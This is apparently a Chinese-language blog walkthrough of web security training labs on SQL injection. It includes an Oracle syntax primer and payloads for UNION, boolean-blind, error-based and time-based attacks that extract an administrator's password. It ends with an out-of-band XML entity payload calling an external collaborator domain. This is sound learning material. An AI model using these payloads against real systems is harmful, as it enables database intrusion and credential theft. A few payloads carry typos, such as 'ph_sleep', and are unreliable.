+<p>前面学到的 <code>SELECT</code>、<code>WHERE</code>、<code>ORDER BY</code>、<code>UNION</code> 思路仍然适用，主要变化是 Oracle 的系统视图和函数。</p>
+<p>Oracle 常见查询：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查询常量</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> dual;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询当前用户</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">USER</span> <span class="keyword">FROM</span> dual;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询当前 Schema</span></span><br><span class="line"><span class="keyword">SELECT</span> SYS_CONTEXT(<span class="string">&#x27;USERENV&#x27;</span>, <span class="string">&#x27;CURRENT_SCHEMA&#x27;</span>)</span><br><span class="line"><span class="keyword">FROM</span> dual;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询 Oracle 版本</span></span><br><span class="line"><span class="keyword">SELECT</span> banner</span><br><span class="line"><span class="keyword">FROM</span> v$version;</span><br></pre></td></tr></table></figure>
+
+<p>查询表和列：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 当前用户拥有的表</span></span><br><span class="line"><span class="keyword">SELECT</span> table_name</span><br><span class="line"><span class="keyword">FROM</span> user_tables;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 当前用户有权限访问的表</span></span><br><span class="line"><span class="keyword">SELECT</span> owner, table_name</span><br><span class="line"><span class="keyword">FROM</span> all_tables;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询某张表的列</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name, data_type</span><br><span class="line"><span class="keyword">FROM</span> user_tab_columns</span><br><span class="line"><span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;USERS&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>查询数据：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> users</span><br><span class="line"><span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;administrator&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> username, password</span><br><span class="line"><span class="keyword">FROM</span> users</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> username;</span><br></pre></td></tr></table></figure>
+
+<p>限制返回行数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Oracle 12c 及以上</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> users</span><br><span class="line"><span class="keyword">FETCH</span> <span class="keyword">FIRST</span> <span class="number">10</span> <span class="keyword">ROWS</span> <span class="keyword">ONLY</span>;</span><br></pre></td></tr></table></figure>
+
+<p>旧版本也常见：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> users</span><br><span class="line"><span class="keyword">WHERE</span> ROWNUM <span class="operator">&lt;=</span> <span class="number">10</span>;</span><br></pre></td></tr></table></figure>
+
+<p>字符串和常用函数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 字符串拼接</span></span><br><span class="line"><span class="keyword">SELECT</span> username <span class="operator">||</span> <span class="string">&#x27;:&#x27;</span> <span class="operator">||</span> password</span><br><span class="line"><span class="keyword">FROM</span> users;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 字符串长度</span></span><br><span class="line"><span class="keyword">SELECT</span> LENGTH(username)</span><br><span class="line"><span class="keyword">FROM</span> users;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 截取字符串</span></span><br><span class="line"><span class="keyword">SELECT</span> SUBSTR(username, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="keyword">FROM</span> users;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 空值替换</span></span><br><span class="line"><span class="keyword">SELECT</span> NVL(email, <span class="string">&#x27;unknown&#x27;</span>)</span><br><span class="line"><span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure>
+
+<p>注释：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 单行注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 多行注释 */</span></span><br></pre></td></tr></table></figure>
+
+<p>和 MySQL 的主要区别：</p>
+<table>
+<thead>
+<tr>
+<th>目的</th>
+<th>MySQL</th>
+<th>Oracle</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查询版本</td>
+<td><code>@@version</code></td>
+<td><code>v$version</code></td>
+</tr>
+<tr>
+<td>查询表</td>
+<td><code>information_schema.tables</code></td>
+<td><code>user_tables</code> &#x2F; <code>all_tables</code></td>
+</tr>
+<tr>
+<td>查询列</td>
+<td><code>information_schema.columns</code></td>
+<td><code>user_tab_columns</code></td>
+</tr>
+<tr>
+<td>字符串拼接</td>
+<td><code>CONCAT(a,b)</code></td>
+<td>&#96;a</td>
+</tr>
+<tr>
+<td>查询常量</td>
+<td><code>SELECT &#39;x&#39;</code></td>
+<td><code>SELECT &#39;x&#39; FROM dual</code></td>
+</tr>
+<tr>
+<td>限制行数</td>
+<td><code>LIMIT 10</code></td>
+<td><code>FETCH FIRST 10 ROWS ONLY</code> 或 <code>ROWNUM</code></td>
+</tr>
+</tbody></table>
+<p><code>UNION SELECT</code> 的列数和类型匹配规则仍然一样；需要替换的主要是 MySQL 的 <code>@@version</code>、<code>information_schema</code> 等数据库特有语法。</p>
+<p>进入这道题目,先查表名</p>
+<p><code>?category=Accessories%27%20union%20select%20table_name,NULL%20from%20all_tables--+</code></p>
+<p>再查表中的列名</p>
+<p><code>?category=Gifts%27%20UNION%20SELECT%20column_name%2CNULL%20FROM%20user_tab_columns%20WHERE%20table_name=%27USERS_VTTKNZ%27--%20</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104141421828.png" alt="image-20261104141421828"></p>
+<p><code>?category=Gifts%27%20UNION%20SELECT%20USERNAME_ITVHCI%2CPASSWORD_BTZDRV%20FROM%20USERS_VTTKNZ--%20</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104141650307.png" alt="image-20261104141650307"></p>
+<h1 id="Lab7-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query"><a href="#Lab7-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query" class="headerlink" title="Lab7: SQL injection UNION attack, determining the number of columns returned by the query"></a>Lab7: SQL injection UNION attack, determining the number of columns returned by the query</h1><p>利用union查询，返回空列数</p>
+<p><code>?category=Tech+gifts&#39; order by 1--+</code></p>
+<p><code>?category=Tech+gifts&#39; order by 2--+</code></p>
+<p><code>?category=Tech+gifts&#39; order by 3--+</code></p>
+<p>3之后报错，那么查询出来有三列</p>
+<p>直接构造payload</p>
+<p><code>?category=Tech+gifts%27%20union%20select%20NULL,NULL,NULL--+</code></p>
+<h1 id="Lab8-SQL-injection-UNION-attack-finding-a-column-containing-text"><a href="#Lab8-SQL-injection-UNION-attack-finding-a-column-containing-text" class="headerlink" title="Lab8: SQL injection UNION attack, finding a column containing text"></a>Lab8: SQL injection UNION attack, finding a column containing text</h1><p>将给的随机值在网页中显示出来</p>
+<p>利用union查询，返回空列数</p>
+<p><code>?category=Tech+gifts&#39; order by 1--+</code></p>
+<p><code>?category=Tech+gifts&#39; order by 2--+</code></p>
+<p><code>?category=Tech+gifts&#39; order by 3--+</code></p>
+<p>3之后报错，那么查询出来有三列，那么就一个一个尝试</p>
+<p><code>?category=Accessories%27%20union%20select%20NULL,%27KRMjR4%27,NULL--+</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104142803785.png" alt="image-20261104142803785"></p>
+<p>这里深究一下原因</p>
+<p>第一类是列类型不同。原查询的三列可能类似：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第 1 列：数字，例如商品 ID</span><br><span class="line">第 2 列：字符，例如商品名称或描述</span><br><span class="line">第 3 列：数字、日期或其他类型</span><br></pre></td></tr></table></figure>
+
+<p>所以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NULL, &#x27;KRMjR4&#x27;, NULL</span><br></pre></td></tr></table></figure>
+
+<p>可以执行，因为第二列接收字符串，第一和第三列用 <code>NULL</code> 占位。</p>
+<p>第二类是应用页面只渲染了第二列。数据库返回三列，但后端模板可能只使用其中一个字段，例如伪代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rows = db.execute(sql)</span><br><span class="line"></span><br><span class="line">for row in rows:</span><br><span class="line">    html += &quot;&lt;h3&gt;&quot; + row[1] + &quot;&lt;/h3&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>或者 ORM 映射后，页面模板只显示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">product.name</span><br></pre></td></tr></table></figure>
+
+<p>而 <code>row[0]</code> 和 <code>row[2]</code> 可能被当作 ID、价格、图片地址等字段，没有直接显示。</p>
+<h1 id="Lab9-SQL-injection-UNION-attack-retrieving-data-from-other-tables"><a href="#Lab9-SQL-injection-UNION-attack-retrieving-data-from-other-tables" class="headerlink" title="Lab9: SQL injection UNION attack, retrieving data from other tables"></a>Lab9: SQL injection UNION attack, retrieving data from other tables</h1><p>常见关系型数据库查询版本的方法如下：</p>
+<table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>普通查询</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MySQL &#x2F; MariaDB</td>
+<td><code>SELECT VERSION();</code></td>
+</tr>
+<tr>
+<td>MySQL &#x2F; MariaDB</td>
+<td><code>SELECT @@version;</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>SELECT version();</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>SHOW server_version;</code></td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>SELECT banner FROM v$version;</code></td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>SELECT version FROM product_component_version;</code></td>
+</tr>
+<tr>
+<td>SQL Server</td>
+<td><code>SELECT @@VERSION;</code></td>
+</tr>
+<tr>
+<td>SQL Server</td>
+<td><code>SELECT SERVERPROPERTY(&#39;ProductVersion&#39;);</code></td>
+</tr>
+<tr>
+<td>SQLite</td>
+<td><code>SELECT sqlite_version();</code></td>
+</tr>
+<tr>
+<td>Snowflake</td>
+<td><code>SELECT CURRENT_VERSION();</code></td>
+</tr>
+</tbody></table>
+<p>这里测试出来时两列，然后测试了好多查询版本的，发现时是<code>PostgreSQL</code></p>
+<p>那么就正常来查询表名-&gt;列名-&gt;数据</p>
+<p>查表</p>
+<p><code>?category=Gifts%27+UNION+SELECT+table_name%2CNULL+FROM+information_schema.tables--+</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104150118244.png" alt="image-20261104150118244"></p>
+<p>查列名</p>
+<p><code>?category=Gifts%27+UNION+SELECT+column_name%2CNULL+FROM+information_schema.columns+WHERE+table_name%3D%27users%27--+</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104150237816.png" alt="image-20261104150237816"></p>
+<p>查数据</p>
+<p><code>?category=Gifts%27+UNION+SELECT+username%2Cpassword+FROM+users--+</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104145347795.png" alt="image-20261104145347795"></p>
+<h1 id="Lab10-SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column"><a href="#Lab10-SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column" class="headerlink" title="Lab10: SQL injection UNION attack, retrieving multiple values in a single column"></a>Lab10: SQL injection UNION attack, retrieving multiple values in a single column</h1><p>依旧还是两列</p>
+<p>测试之后发现第二列可以显示出来，第一列不行</p>
+<p>那么还是老流程查表名-&gt;查列名-&gt;查数据</p>
+<p>查表名</p>
+<p><code>?category=Gifts%27%20union%20select%20%271%27,NULL%20from%20information_schema.tables--+</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104153813375.png" alt="image-20261104153813375"></p>
+<p>查列名</p>
+<p><code>?category=Gifts%27%20union%20select%20NULL,column_name%20from%20information_schema.columns%20where%20table_name=%27users%27--+</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104153958057.png" alt="image-20261104153958057"></p>
+<p>查数据，因为这里第一列不能正常显示数据，所以要把账号密码都显示在第二列</p>
+<p><code>?category=Gifts%27+UNION+SELECT+NULL,username||%27~%27||password+FROM+users--</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104154433663.png" alt="image-20261104154433663"></p>
+<p><code>username || &#39;~&#39; || password</code> 这种写法，这是 SQL 的<strong>字符串拼接</strong>。</p>
+<p><code>||</code> 表示把左右两边的文本连接起来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username || &#x27;~&#x27; || password</span><br></pre></td></tr></table></figure>
+
+<p>假设：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = alice</span><br><span class="line">password = abc123</span><br></pre></td></tr></table></figure>
+
+<p>拼接过程就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alice + ~ + abc123 → alice~abc123</span><br></pre></td></tr></table></figure>
+
+<p><code>&#39;~&#39;</code> 是一个普通字符串，作为分隔符使用，也可以换成 <code>&#39;:&#39;</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username || &#x27;:&#x27; || password</span><br><span class="line">-- 结果：alice:abc123</span><br></pre></td></tr></table></figure>
+
+<h1 id="Lab11-Blind-SQL-injection-with-conditional-responses"><a href="#Lab11-Blind-SQL-injection-with-conditional-responses" class="headerlink" title="Lab11: Blind SQL injection with conditional responses"></a>Lab11: Blind SQL injection with conditional responses</h1><p>这里的内容在之前是没有学习到了，现在给自己补充一下</p>
+<p><strong>当处理包含TrackingId cookie的请求时，应用程序使用SQL查询来确定这是否是已知用户</strong>，因此可能也会存在sql注入</p>
+<p>布尔盲注常用的不是“特殊注入函数”，而是把数据库中的信息转换成真假条件。常见函数有这些：</p>
+<table>
+<thead>
+<tr>
+<th>目的</th>
+<th>PostgreSQL &#x2F; Oracle &#x2F; SQLite</th>
+<th>MySQL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>截取字符</td>
+<td><code>SUBSTRING(password,1,1)</code></td>
+<td><code>SUBSTRING(password,1,1)</code></td>
+</tr>
+<tr>
+<td>获取长度</td>
+<td><code>LENGTH(password)</code></td>
+<td><code>LENGTH(password)</code></td>
+</tr>
+<tr>
+<td>获取字符编码</td>
+<td><code>ASCII(SUBSTRING(password,1,1))</code></td>
+<td><code>ASCII(SUBSTRING(password,1,1))</code></td>
+</tr>
+<tr>
+<td>判断是否存在</td>
+<td><code>EXISTS(SELECT 1 FROM users ...)</code></td>
+<td>同样支持</td>
+</tr>
+<tr>
+<td>条件分支</td>
+<td><code>CASE WHEN 条件 THEN ... ELSE ... END</code></td>
+<td>同样支持</td>
+</tr>
+<tr>
+<td>字符拼接</td>
+<td>&#96;username</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>其中<strong>最常用的函数</strong>:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SUBSTRING</span>() #取字符</span><br><span class="line">LENGTH()  #测长度</span><br><span class="line">ASCII()  #猜具体字符</span><br></pre></td></tr></table></figure>
+
+<p>学习完这些函数直接来这道具体的题目实践一下</p>
+<p>先抓个包<img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104191129418.png" alt="image-20261104191129418"></p>
+<p>测试一下<code>TrackingId</code> ,<code>&#39; and 1=1--</code> 出现了welcome back！</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104191214930.png" alt="image-20261104191214930"></p>
+<p>换成了<code>&#39; and 1=2--</code> ，welcome back就消失了</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104191255925.png" alt="image-20261104191255925"></p>
+<p>有布尔盲注，那么现在来找一下我们需要的密码的长度</p>
+<p><code>&#39; and (select LENGTH(password) from users where username= &#39;administrator&#39;)&gt;19 --</code></p>
+<p>测到大于20发现welcome back就消失了，那么这个密码的长度肯定是20位</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104191630478.png" alt="image-20261104191630478"></p>
+<p>那么现在来猜密码都是什么字符，从第一个猜到第二十个，肯定要爆破了，然后这里用截取字符串的函数</p>
+<p><strong><code>SUBSTRING(string, start, length)</code></strong>：截取字符串</p>
+<p>那么就是爆破start索引和函数截取出来的字符</p>
+<p>只有and的条件都为真的时候才会有welcome back</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104192457058.png" alt="image-20261104192457058"></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104192706712.png" alt="image-20261104192706712"></p>
+<p>payload1选1-20的数字</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104192830653.png" alt="image-20261104192830653"></p>
+<p>payload2选择26个字母和0-9的数字</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104192925654.png" alt="image-20261104192925654"></p>
+<p>然后匹配在settings里面选择匹配一下welcome back</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104193017667.png" alt="image-20261104193017667"></p>
+<p>爆破完筛选一下welcome back！</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104193417461.png" alt="image-20261104193417461"></p>
+<h1 id="Lab12-Blind-SQL-injection-with-conditional-errors"><a href="#Lab12-Blind-SQL-injection-with-conditional-errors" class="headerlink" title="Lab12: Blind SQL injection with conditional errors"></a>Lab12: Blind SQL injection with conditional errors</h1><p>这道题目是条件错误的SQL盲注，而且还是Oracle数据库</p>
+<p>先构造一个查询</p>
+<p><code>&#39;||(select &#39;&#39; from dual)||&#39;</code></p>
+<p>发现是正常的</p>
+<p>然后再构造一个肯定不正常的查询</p>
+<p><code>&#39;||(select &#39;&#39; from dual)||&#39;</code> 出现报错。这个时候就可以确认，sql语句肯定被带入查询了</p>
+<p>然后查询是否存在users表</p>
+<p><code>&#39; ||(select &#39;&#39; from users where rownum=1)||&#39;--</code>,页面返回是正常的</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104203726079.png" alt="image-20261104203726079"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    <span class="keyword">CASE</span> </span><br><span class="line">        <span class="keyword">WHEN</span> (your<span class="operator">-</span><span class="keyword">condition</span><span class="operator">-</span>here) </span><br><span class="line">        <span class="keyword">THEN</span> TO_CHAR(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>)  <span class="comment">-- 条件成立时执行，执行数据库报错</span></span><br><span class="line">        <span class="keyword">ELSE</span> <span class="keyword">NULL</span>          <span class="comment">-- 条件不成立时返回NULL</span></span><br><span class="line">    <span class="keyword">END</span> </span><br><span class="line"><span class="keyword">FROM</span> DUAL;</span><br></pre></td></tr></table></figure>
+
+<p>构造一个查询的语句，让条件永真，然后我们去查一些我们想要知道的东西，如果我们查到了，就一定会报错</p>
+<p>那么来查询一下到底存不存在这个管理员用户</p>
+<p><code>&#39;||(select case when (1=1) then to_char(1/0) else &#39;&#39; end from users where username=&#39;administrator&#39;)||&#39;</code></p>
+<p>报错了，那么肯定是存在的</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104204137504.png" alt="image-20261104204137504"></p>
+<p>然后判断他的密码的长度</p>
+<p><code>&#39;||(select case when length(password)&gt;1 then to_char(1/0) else &#39;&#39; end from users where username=&#39;administrator&#39;)||&#39;</code></p>
+<p>一致报错，知道密码的长度大于20的时候，不报错了，那么就判断密码长度是20</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104204423204.png" alt="image-20261104204423204"></p>
+<p>那么下一步就肯定是要爆破密码了，和上一题一样，只不过换了个数据库，用的函数不一样</p>
+<p><code>&#39;||(select case when substr(password,1,1)=&#39;a&#39; then to_char(1/0) else &#39;&#39; end from users where username=&#39;administrator&#39;)||&#39;</code></p>
+<p>这里用的是substr(),用法一致</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104204615336.png" alt="image-20261104204615336"></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104204822077.png" alt="image-20261104204822077"></p>
+<h1 id="Lab13-Visible-error-based-SQL-injection"><a href="#Lab13-Visible-error-based-SQL-injection" class="headerlink" title="Lab13: Visible error-based SQL injection"></a>Lab13: Visible error-based SQL injection</h1><p>先正常测试一下，看到了报错，引号没闭合</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104205831788.png" alt="image-20261104205831788"></p>
+<p>加上注释之后正常了</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104205853788.png" alt="image-20261104205853788"></p>
+<p><code>&#39; order by 2</code> 都报错，那肯定是只返回一行</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104205927730.png" alt="image-20261104205927730"></p>
+<p>试一下直接union查询,<code>&#39; union select 1--</code>类型不匹配,不是int类型的</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104210122116.png" alt="image-20261104210122116"></p>
+<p>经过判断发现是布尔类型的？好奇怪</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104210842442.png" alt="image-20261104210842442"></p>
+<p><code>&#39; and 1=CAST((select username from users) as int) --</code>后面构造一个布尔类型的，加一个字查询</p>
+<p>查出来的字段，如果不能转化为int类型，那么就报错，报错的同时也会显示那些部分不能被转化为int型</p>
+<p>也就把账号或者密码带出来了,但是出现了一个报错，仔细看一下发现我们的代码不全，猜测是不是被限制了长度，那么直接把Trackingid删了，保留引号即可</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104211522173.png" alt="image-20261104211522173"></p>
+<p>这里出了问题是返回的数据超过了一行</p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104211043787.png" alt="image-20261104211043787"></p>
+<p>限制一下 <code>&#39; and 1=CAST((select username from users limit 1) as int) --</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104211425453.png" alt="image-20261104211425453"></p>
+<p>查询一下密码看看<code>&#39; and 1=CAST((select password from users limit 1) as int) --</code></p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104211653153.png" alt="image-20261104211653153"></p>
+<p>个人感觉有报错比盲注简单</p>
+<h1 id="Lab14-Blind-SQL-injection-with-time-delays"><a href="#Lab14-Blind-SQL-injection-with-time-delays" class="headerlink" title="Lab14: Blind SQL injection with time delays"></a>Lab14: Blind SQL injection with time delays</h1><p>实验要求很简单，实现一下时间盲注就行，抓包添加函数，然后发包<code>&#39;||pg_sleep(10)</code> </p>
+<p><img src="https://raw.githubusercontent.com/xhcola/typora_drawing_bed/main/Image/image-20261104212407646.png" alt="image-20261104212407646"></p>
+<h1 id="Lab15-Blind-SQL-injection-with-time-delays-and-information-retrieval"><a href="#Lab15-Blind-SQL-injection-with-time-delays-and-information-retrieval" class="headerlink" title="Lab15: Blind SQL injection with time delays and information retrieval"></a>Lab15: Blind SQL injection with time delays and information retrieval</h1><p>这里就只写payload吧，实在是有点累</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;||ph_sleep(10)-- #确实是延迟了十秒才返回，确定有sql注入</span></span><br><span class="line"><span class="string"># 下面来确定一下数据库中是否有users表，其实和哪个反推的那个题很像，只不过加入了sleep</span></span><br><span class="line"><span class="string">&#x27;</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>) <span class="keyword">then</span> pg_sleep(<span class="number">10</span>) <span class="keyword">else</span> pg_sleep(<span class="number">-1</span>) <span class="keyword">end</span>)<span class="comment">--</span></span><br><span class="line"># 这个还是一样的查到管理员了就延迟十秒，如果确是延迟了确定是有管理员</span><br><span class="line"><span class="string">&#x27;||(select case when(username=&#x27;</span>administrator<span class="string">&#x27;) then pg_sleep(10) else pg_sleep(-1) end from users)</span></span><br><span class="line"><span class="string"># 查密码的长度,依旧查到20</span></span><br><span class="line"><span class="string">&#x27;</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span>(username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span> <span class="keyword">and</span> LENGTH(password)<span class="operator">&gt;</span><span class="number">1</span>) <span class="keyword">then</span> pg_sleep(<span class="number">10</span>) <span class="keyword">else</span> pg_sleep(<span class="number">-1</span>) <span class="keyword">end</span> <span class="keyword">from</span> users)</span><br><span class="line"># 爆破密码，和之前的题是一样的</span><br><span class="line"><span class="string">&#x27;||(select case when(username=&#x27;</span>administrator<span class="string">&#x27; and substring(password,1,1)=&#x27;</span></span><br><span class="line">a<span class="string">&#x27;) then pg_sleep(10) else pg_sleep(-1) end from users)--</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Lab16-Blind-SQL-injection-with-out-of-band-interaction"><a href="#Lab16-Blind-SQL-injection-with-out-of-band-interaction" class="headerlink" title="Lab16: Blind SQL injection with out-of-band interaction"></a>Lab16: Blind SQL injection with out-of-band interaction</h1><p>先去burp的collaborator中生成一个域名，然后按照提示里给的payload组合一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//93atq26cmnkcbfq8xmuotiyd248vwlka.oastify.com/&quot;&gt;+%25remote%3b]&gt;&#x27;),&#x27;/l&#x27;)+FROM+dual--;</span><br></pre></td></tr></table></figure>
